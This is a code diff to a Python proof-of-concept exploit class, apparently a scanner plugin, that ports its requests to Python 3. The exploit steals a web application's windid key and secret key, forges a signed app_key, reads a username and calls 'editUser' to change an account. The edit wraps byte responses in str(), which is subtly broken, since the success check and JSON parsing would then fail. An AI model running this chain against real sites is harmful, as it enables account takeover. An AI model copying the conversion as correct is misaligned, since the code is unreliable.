@@ -68,7 +68,7 @@ class Poc(ABPoc):
 
             request = urllib.request.Request(
                 windidkey_url, headers=headers_cookie)
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
 
             # Get windidkey
             try:
@@ -80,7 +80,7 @@ class Poc(ABPoc):
             # Get secretkey
             request = urllib.request.Request(secretkey_url % (
                 url, uid, windidkey, _time), data='uid=undefined')
-            response = json.loads(urllib.request.urlopen(request).read())
+            response = json.loads(str(urllib.request.urlopen(request).read()))
             try:
                 secretkey = response['1']['secretkey']
             except:
@@ -112,7 +112,7 @@ class Poc(ABPoc):
 
             request = urllib.request.Request(
                 windidkey_url, headers=headers_cookie)
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
 
             # Get windidkey
             try:
@@ -124,7 +124,7 @@ class Poc(ABPoc):
             # Get secretkey
             request = urllib.request.Request(secretkey_url % (
                 url, uid, windidkey, _time), data='uid=undefined')
-            response = json.loads(urllib.request.urlopen(request).read())
+            response = json.loads(str(urllib.request.urlopen(request).read()))
             try:
                 secretkey = response['1']['secretkey']
             except:
@@ -137,7 +137,7 @@ class Poc(ABPoc):
                 md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
             request = urllib.request.Request(vul_url % (
                 url, 'get', app_key, _time), data=urllib.parse.urlencode(data))
-            response = json.loads(urllib.request.urlopen(request).read())
+            response = json.loads(str(urllib.request.urlopen(request).read()))
             try:
                 username = response['username']
             except:
@@ -150,7 +150,7 @@ class Poc(ABPoc):
                 md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
             request = urllib.request.Request(vul_url % (
                 url, 'editUser', app_key, _time), data=urllib.parse.urlencode(data))
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
 
             # Success
             if response == '1':
